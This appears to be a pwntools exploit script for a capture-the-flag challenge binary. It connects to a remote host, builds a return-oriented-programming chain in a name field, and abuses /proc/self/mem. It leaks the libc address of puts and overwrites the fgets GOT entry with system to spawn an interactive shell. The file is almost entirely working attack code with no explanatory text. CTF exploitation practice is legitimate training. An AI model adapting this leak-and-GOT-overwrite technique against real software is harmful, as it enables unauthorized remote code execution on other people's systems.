from pwn import *

remote_b = True

def main():
  elf = ELF("./random-exe")
  libc = ELF("./xmas-libc.so.6")

  if remote_b:
    p = remote("199.247.6.180", 10004)
  else:
    p = process("./random_exe_name_patched")
    gdb.attach(p, """
    """)

  p.recvuntil(":")
    
  #0x00000000004014f3 : pop rdi ; ret
  pop_rdi_ret = p64(0x00000000004014f3)
  #0x00000000004014f1 : pop rsi ; pop r15 ; ret
  pop_rsi_r15_ret = p64(0x00000000004014f1)
    
  name = 0x4040e0

  fname = ""
  fname += "/proc/self/mem"
  fname += "\x00"
  fname += p64(u64("%p" + "\x00"*6))
  fname += p64(u64("/bin/sh\x00"))

  fname_part_one = fname

  # leak libc
  fname += pop_rdi_ret
  fname += p64(elf.got['puts'])
  fname += p64(elf.symbols['puts'])

  # random call to puts (to set rax),
  # otherwise will scanf segfault
  fname += pop_rdi_ret
  fname += p64(0x403fe8) # null str
  fname += p64(elf.symbols['puts'])

  fname += pop_rdi_ret
  fname += p64(name + len(fname_part_one) - 16) # %p
  fname += pop_rsi_r15_ret
  fname += p64(elf.got['fgets'])
  fname += "A"*8
  fname += p64(0x4010f0)

  fname += pop_rdi_ret
  fname += p64(name + len(fname_part_one) - 8) # /bin/sh
  fname += p64(elf.symbols['fgets'])    
 
  p.sendline(fname)
    
  p.recvuntil("(y/n)")
  p.sendline("y")

  i = 650
  p.recvuntil(":")
  p.sendline(str(i))
    
  p.recvuntil(":")
  p.sendline(str(0x4040e0 - (i- 100 - 30) + len(fname_part_one)))


  # \r vs \r\n
  fwrite_newline_offset = 1
  if remote_b:
    fwrite_newline_offset = 2
   
  a = ""
  a += p.recvline()
  a += p.recvline()
  a += p.recvline()
  a += p.recvline()
  a += p.recvline()

  leak = a[:-(fwrite_newline_offset*2)][-6:]

  print hexdump(leak)

  puts_leak = u64(leak.ljust(8, "\x00"))
  print "puts leak: %s" % hex(puts_leak)

  libc_base = puts_leak - libc.symbols['puts']
  print "libc base: %s" % hex(libc_base)

  p.sendline(hex(libc_base + libc.symbols["system"])[2:])
    
  p.interactive()

if __name__ == "__main__":
    main()

